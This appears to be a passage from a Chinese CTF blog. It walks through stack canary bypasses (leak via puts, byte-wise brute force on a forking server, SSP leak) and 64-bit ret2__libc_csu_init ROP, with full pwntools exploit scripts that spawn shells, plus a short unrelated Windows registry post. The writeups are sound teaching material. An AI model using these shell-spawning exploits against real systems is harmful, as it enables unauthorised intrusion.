&#123; v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]SCV GOOD TO GO,SIR....\"); std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"1.FEED SCV....\"); std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"2.REVIEW THE FOOD....\"); std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v8 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"3.MINE MINERALS....\"); std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v9 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v9, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"&gt;&gt;\"); std::istream::operator&gt;&gt;(&amp;std::cin, &amp;choice); switch ( choice ) &#123; case 2: // show v15 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v15, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v16 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]REVIEW THE FOOD...........\"); std::ostream::operator&lt;&lt;(v16, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v17 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v17, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v18 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]PLEASE TREAT HIM WELL.....\"); std::ostream::operator&lt;&lt;(v18, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v19 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v19, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); puts(&amp;buf); break; case 3: // exit v24 = 0; v20 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]BYE ~ TIME TO MINE MIENRALS...\"); std::ostream::operator&lt;&lt;(v20, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); break; case 1: // edit v10 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v10, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v11 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]SCV IS ALWAYS HUNGRY.....\"); std::ostream::operator&lt;&lt;(v11, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v12 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v12, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v13 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]GIVE HIM SOME FOOD.......\"); std::ostream::operator&lt;&lt;(v13, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v14 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v14, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"&gt;&gt;\"); v25 = read(0, &amp;buf, 0xF8uLL); break; default: v21 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]DO NOT HURT MY SCV....\"); std::ostream::operator&lt;&lt;(v21, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); break; &#125; &#125; return 0LL;&#125; 在case 1存在buffer overflow，通过调试观察到输入与Canary之间的偏移为168。如果要泄漏Canary的话，就必须让所有的\\x00被覆盖掉，包括Canary低位的\\x00，以让puts认为buf连同Canary为一个字符串。libc也可以用同样的方式泄漏，最后放上exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'amd64'local = 1if local: p = process('./scv', env=&#123;'LD_PRELOAD':'./libc-2.23.so'&#125;)else: p = remote('127.0.0.1', 8888)libc = ELF('./libc-2.23.so')elf = ELF('./scv')# gdb.attach(p)system_offset = libc.symbols['system']str_bin_sh_offset = next(libc.search('/bin/sh'))log.success('system_offset = ' + hex(system_offset))log.success('str_bin_sh_offset = ' + hex(str_bin_sh_offset))pop_rdi_ret = 0x0000000000400ea3log.success('pop_rdi_ret = ' + hex(pop_rdi_ret))one_gadget_offset = 0x45216log.success('one_gadget_offset = ' + hex(one_gadget_offset))libc_base_offset = 0x3a20alog.success('libc_base_offset = ' + hex(libc_base_offset))def edit(content): p.sendlineafter('&gt;&gt;', '1') p.recvuntil('&gt;&gt;') p.send(content)def show(): p.sendlineafter('&gt;&gt;', '2')def quit(): p.sendlineafter('&gt;&gt;', '3')edit('A' * (40 - 1) + ':')show()p.recvuntil(':')leak_addr = u64(p.recv(6).ljust(8, '\\x00'))log.success('leak_addr = ' + hex(leak_addr))libc_base = leak_addr - libc_base_offsetlog.success('libc_base = ' + hex(libc_base))system = libc_base + str_bin_sh_offsetstr_bin_sh = libc_base + str_bin_sh_offsetlog.success('system = ' + hex(system))log.success('str_bin_sh = ' + hex(str_bin_sh))edit('A' * 168 + ':')show()p.recvuntil(':')canary = u64('\\x00' + p.recv(7))log.success('canary = ' + hex(canary))payload = flat([ 'A' * 168, canary, 'B' * 8, pop_rdi_ret, str_bin_sh, system])edit(payload)quit()p.interactive() 爆破CanaryCanary之所以被认为是安全的，是因为对其进行爆破成功率太低。以32位程序为例，除去最后一个\\x00，其可能值将会是0x100^3=16777216（实际上由于Canary的生成规则会小于这个值），64位下的Canary值更是远大于这个数量级。此外，一旦Canary爆破失败，程序就会立即结束，Canary值也会再次更新，使得爆破更加困难。但是同一个进程内所有的Canary值都是一致的，当程序有多个进程，且子进程内出现了栈溢出时，由于子进程崩溃不会影响到主进程，我们就可以进行爆破。甚至我们可以通过逐位爆破来减少爆破时间。 2017-NSCTF-pwn2123456[*] '/home/assassinq/pwn/ctf-wiki/canary/2017-NSCTF-pwn2/pwn2' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 开启了Canary。main函数中看到只要每次回答Y，可以无限次地fork出新的进程： 123456789101112131415161718192021222324252627282930313233343536int __cdecl main()&#123; char v1; // [esp+1Bh] [ebp-5h] __pid_t pid; // [esp+1Ch] [ebp-4h] setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); while ( 1 ) &#123; write(1, \"[*] Do you love me?[Y]\\n\", 0x17u); if ( getchar() != 'Y' ) break; v1 = getchar(); while ( v1 != '\\n' &amp;&amp; v1 ) ; pid = fork(); if ( pid ) &#123; if ( pid &lt;= 0 ) &#123; if ( pid &lt; 0 ) exit(0); &#125; else // son &#123; wait(0); &#125; &#125; else // father &#123; func(); &#125; &#125; return 0;&#125; func()函数中存在buffer overflow，而且还存在format string，那这里其实是可以用这个漏洞泄漏出Canary的： 12345678910111213141516171819202122unsigned int func()&#123; char *s; // ST18_4 int buf; // [esp+1Ch] [ebp-1Ch] int v3; // [esp+20h] [ebp-18h] int v4; // [esp+24h] [ebp-14h] int v5; // [esp+28h] [ebp-10h] unsigned int v6; // [esp+2Ch] [ebp-Ch] v6 = __readgsdword(0x14u); buf = 0; v3 = 0; v4 = 0; v5 = 0; s = (char *)malloc(0x40u); input_name(&amp;buf); sprintf(s, \"[*] Welcome to the game %s\", &amp;buf); printf(s); puts(\"[*] Input Your Id:\"); read(0, &amp;buf, 0x100u); return __readgsdword(0x14u) ^ v6;&#125; Canary采用爆破的方法，libc则可以用格式化字符串泄漏。放上逐字节爆破exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'i386'p = process('./pwn2', env=&#123;'LD_RELOAD':'./libc.so.6_x86'&#125;)elf = ELF('./pwn2')libc = ELF('./libc.so.6_x86')system_offset = libc.symbols['system']str_bin_sh_offset = next(libc.search('/bin/sh'))log.success('system_offset = ' + hex(system_offset))log.success('str_bin_sh_offset = ' + hex(str_bin_sh_offset))libc_offset = 0x1b2000log.success('libc_offset = ' + hex(libc_offset))one_gadget_offset = 0x3af1clog.success('one_gadget_offset = ' + hex(one_gadget_offset))# gdb.attach(p)def forkNew(): p.sendlineafter('[Y]', 'Y')def inputName(name): p.recvuntil('[*] Input Your name please:') p.send(name)def inputId(Id): p.recvuntil('[*] Input Your Id:') p.send(Id)canary = '\\x00'for i in range(3): for j in range(256): # log.info('try ' + hex(j)) if i != 0 and j == 0: p.sendline('Y') else: forkNew() inputName('%12$p\\n') p.recvuntil('[*] Welcome to the game ') leak_addr = int(p.recv(10), 16) payload = 'A' * 16 payload += canary payload += chr(j) inputId(payload) p.recv() if 'smashing' not in p.recv(): canary += chr(j) log.info('At round %d find canary byte %#x' %(i, j)) breaklog.success('canary = ' + hex(u32(canary)))log.success('leak_addr = ' + hex(leak_addr))libc_base = leak_addr - libc_offsetlog.success('libc_base = ' + hex(libc_base))system = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offsetone_gadget = libc_base + one_gadget_offsetlog.success('system = ' + hex(system))log.success('str_bin_sh = ' + hex(str_bin_sh))log.success('one_gadget = ' + hex(one_gadget))p.sendline('Y')inputName('AssassinQ\\n')payload = flat([ 'A' * 16, canary, 'B' * 12, one_gadget])inputId(payload)p.interactive() SSP（Stack Smashing Protect） Leak除了通过各种方法泄露Canary之外，我们还可以利用__stack_chk_fail函数泄露信息。这种方法作用不大，没办法让我们get shell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做SSP（Stack Smashing Protect） Leak。 1234567891011void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (\"stack smashing detected\");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\");&#125; JarvisOJ-Smashes1234567[*] '/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled 开了Canary，存在溢出但是没法泄漏： 123456789101112131415161718192021222324252627282930unsigned __int64 sub_4007E0()&#123; __int64 i; // rbx int c; // eax __int64 v3; // [rsp+0h] [rbp-128h] unsigned __int64 v4; // [rsp+108h] [rbp-20h] v4 = __readfsqword(0x28u); __printf_chk(1LL, \"Hello!\\nWhat's your name? \"); if ( !_IO_gets((__int64)&amp;v3) )LABEL_9: _exit(1); i = 0LL; __printf_chk(1LL, \"Nice to meet you, %s.\\nPlease overwrite the flag: \"); while ( 1 ) &#123; c = _IO_getc(stdin); if ( c == -1 ) goto LABEL_9; if ( c == '\\n' ) break; flag[i++] = c; if ( i == 32 ) goto LABEL_8; &#125; memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));LABEL_8: puts(\"Thank you, bye!\"); return __readfsqword(0x28u) ^ v4;&#125; 这里想到SSP Leak，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让Canary保护输出我们想要地址上的值： 123.rodata:000000000040094E ; char s[].rodata:000000000040094E s db &apos;Thank you, bye!&apos;,0 ; DATA XREF: sub_4007E0:loc_400878↑o.rodata:000000000040095E align 20h 尝试输出字符串s： 1234567891011#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'p = remote('pwn.jarvisoj.com', 9877)test = 0x40094Ep.recvuntil('What\\'s your name?')p.sendline(p64(test) * 200)p.recvuntil('Please overwrite the flag:')p.sendline()p.recvall()p.interactive() 得到的结果果然泄漏出来了： 123[DEBUG] Received 0x4c bytes: 'Thank you, bye!\\n' '*** stack smashing detected ***: Thank you, bye! terminated\\n' 那么接下来需要做的就是找到存放flag的地址，在ida上找到是0x600d21，但是由于main函数中最后一句话memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));，在调用__stack_chk_fail()的时候，0x600d21上的值早就已经被覆盖成其它值了。通过gdb调试，发现在另一个地址也有flag： 12345assassinq&gt;&gt; find &apos;CTF&apos;Searching for &apos;CTF&apos; in: None rangesFound 2 results, display max 2 items:smashes : 0x400d21 (&quot;CTF&#123;Here&apos;s the flag on server&#125;&quot;)smashes : 0x600d21 (&quot;CTF&#123;Here&apos;s the flag on server&#125;&quot;) 这里就涉及到了elf文件的重映射，当可执行文件足够小的时候，文件的不同区段可能会被多次映射： 123456789101112131415161718assassinq&gt;&gt; vmmap Start End Perm Name0x00400000 0x00401000 r-xp /home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes0x00600000 0x00601000 rw-p /home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fd7000 0x00007ffff7fda000 rw-p mapped0x00007ffff7ff7000 0x00007ffff7ffa000 r--p [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p mapped0x00007ffffffde000 0x00007ffffffff000 rw-p [stack]0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] 那么exp如下： 123456789101112#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'p = remote('pwn.jarvisoj.com', 9877)test = 0x40094Eflag = 0x400d20p.recvuntil('What\\'s your name?')p.sendline(p64(flag) * 200)p.recvuntil('Please overwrite the flag:')p.sendline()p.recvall()p.interactive() Auxiliary Vector直接“挖”到canary产生的本源——AUXV(Auxiliary Vector)，并修改该结构体从而使canary值可控。 2017-TCTF-Final-upxof参考网站https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/https://www.anquanke.com/post/id/85203https://bbs.ichunqiu.com/thread-44069-1-1.htmlhttps://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/https://www.jianshu.com/p/c3624f5dd583https://deadc0de.re/articles/microwave-write-up.htmlhttps://braddaniels.org/csaw-quals-2017-scv/https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"为Windows系统鼠标右键添加软件和图标","slug":"为Windows系统鼠标右键添加软件和图标","date":"2019-02-15T03:00:27.000Z","updated":"2019-02-15T03:32:47.877Z","comments":true,"path":"2019/02/15/为Windows系统鼠标右键添加软件和图标/","link":"","permalink":"https://qianfei11.github.io/2019/02/15/为Windows系统鼠标右键添加软件和图标/","excerpt":"Windows下不想要总是先打开软件，再把文件拖进去。那就可以修改一下右键菜单。","text":"Windows下不想要总是先打开软件，再把文件拖进去。那就可以修改一下右键菜单。 修改文件右键菜单查壳还有调试的时候总是把文件拖来拖去实在太麻烦了，不如修改一下，直接右键就能开始分析。下面就记录一下修改文件右键菜单的过程： 首先打开注册表： 依次进入计算机\\HKEY_CLASSES_ROOT\\*\\shell，在shell项下新建一个项，这里以PEID为例。然后在新建好的PEID项下，新建字符串值，命名为Icon，并将其值修改为源文件的绝对路径（$PATH_TO_EXE）： 最后再在PEID项下新建项Command，修改其值为&quot;$PATH_TO_EXE&quot; &quot;%1&quot;： 成功后看一看效果： 修改空白处右键菜单在当前目录下打开cmd窗口太麻烦，不如也添加到右键菜单里： 首先同样打开注册表。进入计算机\\HKEY_CLASSES_ROOT\\Directory\\Background\\shell，新建项在此运行CMD，同以上一样新建字符串值Icon，并修改值： 在在此运行CMD下新建项Command，修改值为$PATH_TO_EXE，这里不需要双引号&quot;，也不需要%1： 看看效果： 参考网站https://blog.csdn.net/p312011150/article/details/81207059","categories":[],"tags":[{"name":"solution","slug":"solution","permalink":"https://qianfei11.github.io/tags/solution/"}]},{"title":"中级ROP-ret2__libc_csu_init-writeup","slug":"中级ROP-ret2-libc-csu-init-writeup","date":"2019-02-12T10:02:50.000Z","updated":"2019-02-14T01:40:26.013Z","comments":true,"path":"2019/02/12/中级ROP-ret2-libc-csu-init-writeup/","link":"","permalink":"https://qianfei11.github.io/2019/02/12/中级ROP-ret2-libc-csu-init-writeup/","excerpt":"用蒸米的一步一步学ROP之linux_x64篇中的level5来研究一下64位的ROP。","text":"用蒸米的一步一步学ROP之linux_x64篇中的level5来研究一下64位的ROP。 64位的程序中，函数所调用的参数并不是全部在栈上，前六个参数分别位于rdi、rsi、rdx、rcx、r8和r9，其余参数则在栈上。同时，可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。所以64位的程序需要通过rop或者libc中的函数来设置参数。 分析程序程序给出的源码如下： 1234567891011121314#undef _FORTIFY_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, \"Hello, World\\n\", 13); vulnerable_function();&#125; 只开了NX，那么vulnerable_function()中的栈溢出是很显然的： 123456[*] '/home/assassinq/pwn/ROP_STEP_BY_STEP/linux_x64/level5_ori/level5' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 没有任何可辅助的函数，同时也找不到可用的gadgets来用，这里就要用到libc中的一个函数__libc_csu_init()： 1234567891011121314151617181920212223242526272829303132333435363738.text:00000000004005A0 mov [rsp+var_28], rbp.text:00000000004005A5 mov [rsp+var_20], r12.text:00000000004005AA lea rbp, cs:600E24h.text:00000000004005B1 lea r12, cs:600E24h.text:00000000004005B8 mov [rsp+var_18], r13.text:00000000004005BD mov [rsp+var_10], r14.text:00000000004005C2 mov [rsp+var_8], r15.text:00000000004005C7 mov [rsp+var_30], rbx.text:00000000004005CC sub rsp, 38h.text:00000000004005D0 sub rbp, r12.text:00000000004005D3 mov r13d, edi.text:00000000004005D6 mov r14, rsi.text:00000000004005D9 sar rbp, 3.text:00000000004005DD mov r15, rdx.text:00000000004005E0 call _init_proc.text:00000000004005E5 test rbp, rbp.text:00000000004005E8 jz short loc_400606.text:00000000004005EA xor ebx, ebx.text:00000000004005EC nop dword ptr [rax+00h].text:00000000004005F0.text:00000000004005F0 loc_4005F0: ; CODE XREF: __libc_csu_init+64↓j.text:00000000004005F0 mov rdx, r15.text:00000000004005F3 mov rsi, r14.text:00000000004005F6 mov edi, r13d.text:00000000004005F9 call qword ptr [r12+rbx*8].text:00000000004005FD add rbx, 1.text:0000000000400601 cmp rbx, rbp.text:0000000000400604 jnz short loc_4005F0.text:0000000000400606.text:0000000000400606 loc_400606: ; CODE XREF: __libc_csu_init+48↑j.text:0000000000400606 mov rbx, [rsp+38h+var_30].text:000000000040060B mov rbp, [rsp+38h+var_28].text:0000000000400610 mov r12, [rsp+38h+var_20].text:0000000000400615 mov r13, [rsp+38h+var_18].text:000000000040061A mov r14, [rsp+38h+var_10].text:000000000040061F mov r15, [rsp+38h+var_8].text:0000000000400624 add rsp, 38h.text:0000000000400628 retn 可以看到在loc_4005F0之后，有对第三个参数rdx、第二个参数rsi以及第一个参数rdi的mov操作。同时如果合理设置r12和rbx的大小，我们能够做到call某个函数。尾巴上还有mov栈上的值到一些寄存器中，仔细观察可以发现这和之前的参数也有一些联系。构造出一个csu()的函数。因为在第二次跳转上去后，还有一次add rsp, 0x38，所以需要在栈上再补56个byte： 1234567891011121314151617181920212223# 4005f0: 4c 89 fa mov rdx,r15# 4005f3: 4c 89 f6 mov rsi,r14# 4005f6: 44 89 ef mov edi,r13d# 4005f9: 41 ff 14 dc call QWORD PTR [r12+rbx*8]# 4005fd: 48 83 c3 01 add rbx,0x1# 400601: 48 39 eb cmp rbx,rbp# 400604: 75 ea jne 4005f0 &lt;__libc_csu_init+0x50&gt;# 400606: 48 8b 5c 24 08 mov rbx,QWORD PTR [rsp+0x8]# 40060b: 48 8b 6c 24 10 mov rbp,QWORD PTR [rsp+0x10]# 400610: 4c 8b 64 24 18 mov r12,QWORD PTR [rsp+0x18]# 400615: 4c 8b 6c 24 20 mov r13,QWORD PTR [rsp+0x20]# 40061a: 4c 8b 74 24 28 mov r14,QWORD PTR [rsp+0x28]# 40061f: 4c 8b 7c 24 30 mov r15,QWORD PTR [rsp+0x30]# 400624: 48 83 c4 38 add rsp,0x38# 400628: c3 retdef csu(rbx, rbp, r12, r13, r14, r15, ret_addr): # function = r12 # rdi = r13, rsi = r14, rdx = r15 payload = flat(['\\x00' * 136, 0x400606, 0, rbx, rbp, r12, r13, r14, r15, 0x4005f0, '\\x00' * 56, ret_addr]) # print repr(payload) p.recvuntil('Hello, World\\n') p.send(payload) sleep(1) 编写exp然后接下来的主要分为三步。第一步泄漏出write()函数的地址，以获取libc： 123456789101112131415# write(STDOUT_FILENO, write_got, 8);# r12 = write_got# rdi = 1, rsi = write_got, rdx = 8log.info('&gt;&gt;&gt; OUTPUT &amp;write_got &lt;&lt;&lt;')csu(0, 1, write_got, 1, write_got, 8, main)write = u64(p.recv(8).ljust(8, '\\x00'))log.success('write = ' + hex(write))libc = LibcSearcher('write', write)log.info('&gt;&gt;&gt; SEARCHING FOR LIBC &lt;&lt;&lt;')libc_base = write - libc.dump('write')system = libc_base + libc.dump('system')execve = libc_base + libc.dump('execve')log.success('libc_base = ' + hex(libc_base))log.success('system = ' + hex(system))log.success('execve = ' + hex(execve)) 这里对libc的泄漏同样也可以通过DynELF来爆破： 123456789def leak(address): csu(0, 1, write_got, 1, address, 8, main_addr) data = p.recv(8) return data# leak libclog.info('&gt;&gt;&gt; LEAK libc &lt;&lt;&lt;')dynelf = DynELF(leak, elf=elf)system_addr = dynelf.lookup('system', 'libc') 拿到libc后可以获得system或者是execve的偏移。同时我们发现bss段可写，故接下来在bss段写入system的地址，以及字符串/bin/sh： 12345678# read(STDIN_FILENO, bss, 16)# r12 = read_got# rdi = 0, rsi = bss, rdx = 16log.info('&gt;&gt;&gt; INPUT execve/system AND str_bin_sh &lt;&lt;&lt;')csu(0, 1, read_got, 0, bss, 16, main)payload = flat([system, '/bin/sh\\x00'])p.send(payload)sleep(1) 最后一部只需要执行call已经写入的system并且将/bin/sh作为参数执行即可： 12345# execve(\"/bin/sh\"); or system(\"/bin/sh\");# r12 = execve/system# rdi = bss + 8 = \"/bin/sh\"log.info('&gt;&gt;&gt; EXECUTE execve(\"/bin/sh\") OR system(\"/bin/sh\") &lt;&lt;&lt;')csu(0, 1, bss, bss + 8, 0, 0, main) 整理一下，最后的exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *# context.log_level = 'debug'context.arch = 'amd64'p = process('./level5')# p = remote('127.0.0.1',10001)elf = ELF('./level5')write_got = elf.got['write']read_got = elf.got['read']main = elf.symbols['main']bss = elf.bss()log.success('write_got = ' + hex(write_got))log.success('read_got = ' + hex(read_got))log.success('main = ' + hex(main))log.success('bss = ' + hex(bss))# gdb.attach(p)# 4005f0: 4c 89 fa mov rdx,r15# 4005f3: 4c 89 f6 mov rsi,r14# 4005f6: 44 89 ef mov edi,r13d# 4005f9: 41 ff 14 dc call QWORD PTR [r12+rbx*8]# 4005fd: 48 83 c3 01 add rbx,0x1# 400601: 48 39 eb cmp rbx,rbp# 400604: 75 ea jne 4005f0 &lt;__libc_csu_init+0x50&gt;# 400606: 48 8b 5c 24 08 mov rbx,QWORD PTR [rsp+0x8]# 40060b: 48 8b 6c 24 10 mov rbp,QWORD PTR [rsp+0x10]# 400610: 4c 8b 64 24 18 mov r12,QWORD PTR [rsp+0x18]# 400615: 4c 8b 6c 24 20 mov r13,QWORD PTR [rsp+0x20]# 40061a: 4c 8b 74 24 28 mov r14,QWORD PTR [rsp+0x28]# 40061f: 4c 8b 7c 24 30 mov r15,QWORD PTR [rsp+0x30]# 400624: 48 83 c4 38 add rsp,0x38# 400628: c3 retdef csu(rbx, rbp, r12, r13, r14, r15, ret_addr): payload = flat(['\\x00' * 136, 0x400606, 0, rbx, rbp, r12, r13, r14, r15, 0x4005f0, '\\x00' * 56, ret_addr]) # print repr(payload) p.recvuntil('Hello, World\\n') p.send(payload) sleep(1)# rdi = edi = r13, rsi = r14, rdx = r15# write(STDOUT_FILENO, write_got, 8);# r12 = write_got# rdi = 1, rsi = write_got, rdx = 8log.info('&gt;&gt;&gt; OUTPUT &amp;write_got &lt;&lt;&lt;')csu(0, 1, write_got, 1, write_got, 8, main)write = u64(p.recv(8).ljust(8, '\\x00'))log.success('write = ' + hex(write))libc = LibcSearcher('write', write)log.info('&gt;&gt;&gt; SEARCHING FOR LIBC &lt;&lt;&lt;')libc_base = write - libc.dump('write')system = libc_base + libc.dump('system')execve = libc_base + libc.dump('execve')log.success('libc_base = ' + hex(libc_base))log.success('system = ' + hex(system))log.success('execve = ' + hex(execve))# read(STDIN_FILENO, bss, 16);# r12 = read_got# rdi = 0, rsi = bss, rdx = 16log.info('&gt;&gt;&gt; INPUT execve/system AND str_bin_sh &lt;&lt;&lt;')csu(0, 1, read_got, 0, bss, 16, main)payload = flat([system, '/bin/sh\\x00'])p.send(payload)sleep(1)# execve(\"/bin/sh\"); or system(\"/bin/sh\");# r12 = execve/system# rdi = bss + 8 = \"/bin/sh\"log.info('&gt;&gt;&gt; EXECUTE execve(\"/bin/sh\") OR system(\"/bin/sh\") &lt;&lt;&lt;')csu(0, 1, bss, bss + 8, 0, 0, main)log.info('&gt;&gt;&gt; PWNED BY ASSASSINQ &lt;&lt;&lt;')p.interactive() 做题的时候遇到的一个小bug是当传的payload中的无意义字符如果不为\\x00，最后跑system会坏掉，但是execve不会影响。如果将buf填充为\\x00，才可以执行system。具体原因还没有弄清楚。 以下再补充一点关于__libc_csu_init()的点，也就是隐藏gadgets： 也是libc设计时的一个bug，不同的偏移下，还能够得到pop rdi ; ret和pop rsi ; pop r15 ; ret两个gadgets： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061assassinq&gt;&gt; x/5i 0x000000000040061A 0x40061a &lt;__libc_csu_init+90&gt;: pop rbx 0x40061b &lt;__libc_csu_init+91&gt;: pop rbp 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14assassinq&gt;&gt; x/5i 0x000000000040061B 0x40061b &lt;__libc_csu_init+91&gt;: pop rbp 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15assassinq&gt;&gt; x/5i 0x000000000040061C 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret assassinq&gt;&gt; x/5i 0x000000000040061D 0x40061d &lt;__libc_csu_init+93&gt;: pop rsp 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 